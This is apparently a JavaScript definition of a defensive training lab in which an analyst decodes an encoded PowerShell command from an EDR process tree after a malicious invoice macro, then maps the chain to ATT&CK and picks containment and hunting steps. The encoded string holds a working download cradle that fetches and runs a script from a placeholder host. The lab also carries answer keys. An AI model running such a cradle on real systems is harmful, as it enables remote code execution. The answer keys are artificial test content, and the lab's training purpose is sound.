// Lab: macro document -> cmd -> encoded PowerShell download cradle, read from an EDR process tree.
// ENC is real Base64 of UTF-16LE text (generated with Node:
//   Buffer.from(script, 'utf16le').toString('base64')), so `base64 -d` in the lab shell decodes it.

const ENC = 'JAB1AD0AJwBoAHQAdABwAHMAOgAvAC8AZgBpAGwAZQBzAC4AaQBuAHYAbwBpAGMAZQAtAHAAbwByAHQAYQBsAC4AZQB4AGEAbQBwAGwAZQAvAHMAdABhAHQAaQBjAC8AcQAzAC8AdQBwAGQAYQB0AGUALgBwAHMAMQAnADsAJAB3AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHcALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAAMQAwAC4AMAA7ACAAVwBpAG4ANgA0ADsAIAB4ADYANAApACcAKQA7ACQAdwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAKAAkAHcALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAkAHUAKQApAA=='
const PAYLOAD_URL = 'https://files.invoice-portal.example/static/q3/update.ps1'

const DOC = 'C:\\Users\\l.harmon\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\8KQ2ZT1M\\Invoice_Q3_88412.docm'

// Line order matters: the "lines" task refers to these 0-based indexes.
const tree = [
  'EDR alert ALRT-88213   Severity: High   Rule: "Office application spawned a command shell"',
  'Host: FIN-WS-0412 (10.40.12.37)   User: CORP\\l.harmon   OS: Windows 11 Enterprise 23H2',
  '',
  'TIME (UTC)  PID    PPID   PROCESS / EVENT',
  '13:02:09    1212   748    svchost.exe -k netsvcs -p -s gpsvc',
  '13:02:14    4630   1212   └─ gpscript.exe /Logon',
  '13:02:15    4688   4630      └─ powershell.exe -ExecutionPolicy Bypass -NoProfile -File \\\\corp.example.com\\NETLOGON\\MapDrives.ps1',
  '13:02:11    4412   4388   explorer.exe',
  '13:02:40    5120   4412   ├─ OneDrive.exe /background',
  '13:03:02    5532   4412   ├─ ms-teams.exe',
  '13:04:51    6010   4412   ├─ chrome.exe --profile-directory=Default',
  '13:05:40    7120   4412   ├─ OUTLOOK.EXE',
  `13:09:17    9024   7120   │  └─ WINWORD.EXE /n "${DOC}" /o ""`,
  `13:09:31    9311   9024   │     └─ cmd.exe /c powershell.exe -nop -w hidden -enc ${ENC.slice(0, 32)}... [truncated]`,
  `13:09:31    9340   9311   │        └─ powershell.exe -nop -w hidden -enc ${ENC}`,
  '13:09:33    9340          │           ├─ [network] TCP 10.40.12.37:51544 -> 198.51.100.45:443 (files.invoice-portal.example)',
  '13:09:36    9340          │           ├─ [file] created C:\\Users\\l.harmon\\AppData\\Local\\Temp\\upd4471.exe',
  '13:09:38    9502   9340   │           └─ upd4471.exe',
  '13:12:30    7811   4412   └─ notepad.exe C:\\Users\\l.harmon\\Documents\\todo.txt',
]

const DIR = '/home/analyst/case'
const TREE = `${DIR}/process_tree.txt`
const B64 = `${DIR}/encoded.b64`

export default {
  id: 'ps-edr',
  title: 'Malicious macro and encoded PowerShell (EDR)',
  objectives: ['1.3', '3.1', '3.3'],
  difficulty: 'Core',
  minutes: 15,
  scenario: `EDR raised a high-severity alert on FIN-WS-0412, a finance workstation, shortly after l.harmon opened an emailed invoice. The process tree is in ${TREE}, and the analyst on shift copied the -enc argument into ${B64}. Decode the payload, work out the chain, and decide on containment and hunting.`,
  files: {
    [TREE]: `${tree.join('\n')}\n`,
    [B64]: `${ENC}\n`,
  },
  artifacts: [{ id: 'tree', title: 'EDR process tree', file: TREE }],
  hints: [
    `base64 -d ${B64}`,
    `grep 9024 ${TREE}`,
    `grep -i "\\[network\\]\\|\\[file\\]" ${TREE}`,
  ],
  tasks: [
    {
      id: 'url', type: 'input',
      prompt: 'Decode the encoded command. What URL does it download from?',
      answer: [PAYLOAD_URL, 'hxxps://files.invoice-portal[.]example/static/q3/update.ps1', 'files.invoice-portal.example/static/q3/update.ps1'],
      cmd: `base64 -d ${B64}`,
      explain: `-enc (-EncodedCommand) takes Base64 of UTF-16LE text, which is why the encoded string is full of "A"s: every ASCII character is followed by a zero byte. Decoded, it is a classic download cradle: a Net.WebClient with a browser-like User-Agent and the user's proxy credentials, then IEX($w.DownloadString('${PAYLOAD_URL}')). The second stage runs in memory and never touches disk as a script. CyberChef recipe: From Base64 -> Decode text (UTF-16LE). On Linux: base64 -d | iconv -f utf-16le.`,
    },
    {
      id: 'parent', type: 'input',
      prompt: 'Which process launched cmd.exe? (image name)',
      answer: ['WINWORD.EXE', 'winword', 'microsoft word', 'word'],
      cmd: `grep 9024 ${TREE}`,
      explain: 'cmd.exe has PPID 9024. Search for 9024 and you find WINWORD.EXE opening Invoice_Q3_88412.docm from the Outlook attachment cache (Content.Outlook). Word has no business starting a shell. Office spawning cmd, powershell, wscript, mshta or rundll32 is one of the highest-fidelity detections there is, and the Attack Surface Reduction rule "Block all Office applications from creating child processes" stops it.',
    },
    {
      id: 'dropped', type: 'input',
      prompt: 'What is the file name of the executable the PowerShell process wrote to disk?',
      answer: ['upd4471.exe', 'C:\\Users\\l.harmon\\AppData\\Local\\Temp\\upd4471.exe'],
      cmd: `grep -F "[file]" ${TREE}`,
      explain: 'The second stage (update.ps1, running inside PID 9340) wrote %LOCALAPPDATA%\\Temp\\upd4471.exe and launched it as PID 9502. Collect that file and hash it. It is the real payload, and its hash is a better hunting pivot than the document, which changes per victim.',
    },
    {
      id: 'chain', type: 'lines', artifact: 'tree',
      prompt: 'Select every line that belongs to the malicious chain.',
      answer: [12, 13, 14, 15, 16, 17],
      explain: 'Lines 13–18: Word opening the .docm, cmd.exe, encoded hidden PowerShell, its outbound connection, the dropped EXE and its execution. The trap is line 7: "powershell.exe -ExecutionPolicy Bypass" looks scary, but its parent is gpscript.exe /Logon and it runs MapDrives.ps1 from NETLOGON. That is a domain logon script, normal in many environments. Judge processes by their lineage and context, not by flags alone.',
    },
    {
      id: 'attack', type: 'grid',
      prompt: 'Map each step to its MITRE ATT&CK technique.',
      columns: [{ key: 't', label: 'Technique', options: ['T1566.001', 'T1566.002', 'T1059.001', 'T1059.003', 'T1027', 'T1105', 'T1053.005'] }],
      rows: [
        { label: 'Invoice_Q3_88412.docm arrives as an email attachment and is opened', answer: { t: 'T1566.001' } },
        { label: 'powershell.exe runs the attacker\'s script', answer: { t: 'T1059.001' } },
        { label: 'Command hidden as Base64 with -enc', answer: { t: 'T1027' } },
        { label: 'Stage 2 and upd4471.exe pulled from files.invoice-portal.example', answer: { t: 'T1105' } },
      ],
      explain: 'T1566.001 is Phishing: Spearphishing Attachment. T1566.002 would be a link. T1059.001 is Command and Scripting Interpreter: PowerShell, while T1059.003 is the Windows command shell (cmd.exe itself). T1027 is Obfuscated Files or Information: the encoding defeats simple command-line keyword matching. T1105 is Ingress Tool Transfer: bringing tools in from outside. Nothing here created a scheduled task (T1053.005).',
    },
    {
      id: 'contain', type: 'single',
      prompt: 'What is the best containment action in the EDR console?',
      options: [
        'Kill PID 9340 and close the alert',
        'Network-contain (isolate) FIN-WS-0412 so it can only talk to the EDR cloud, then collect memory and triage data, and block the hash of upd4471.exe',
        'Delete Invoice_Q3_88412.docm from the user\'s Outlook cache',
        'Add powershell.exe to the EDR block list for all hosts',
      ],
      answer: 1,
      explain: 'upd4471.exe is already running, so killing one PowerShell process doesn\'t remove the implant, and deleting the document is cosmetic. Host isolation cuts the C2 while keeping the EDR channel open for live response and evidence collection. Blocking powershell.exe fleet-wide would break administration and logon scripts like MapDrives.ps1. Use constrained language mode, AMSI and script block logging instead.',
    },
    {
      id: 'hunt', type: 'multi',
      prompt: 'Which fleet-wide hunting queries should you run? Select all that apply.',
      options: [
        'Process creations where the parent is WINWORD/EXCEL/OUTLOOK and the child is cmd, powershell, wscript, mshta or rundll32',
        'PowerShell command lines containing -enc / -EncodedCommand / -w hidden',
        'DNS lookups or connections to files.invoice-portal.example or 198.51.100.45',
        'Files named Invoice_Q3_*.docm, plus the SHA-256 of upd4471.exe, on endpoints and in the mail gateway',
        'Every execution of powershell.exe in the last 90 days',
        'All hosts that have RDP enabled',
      ],
      answer: [0, 1, 2, 3],
      explain: 'Hunt on the behavior (Office to shell, encoded PowerShell), the network IoCs and the file IoCs, then check the mail gateway for every recipient of the same attachment. "Every powershell.exe" returns millions of benign rows with no way to triage them, and RDP exposure is unrelated to this intrusion chain.',
    },
  ],
}
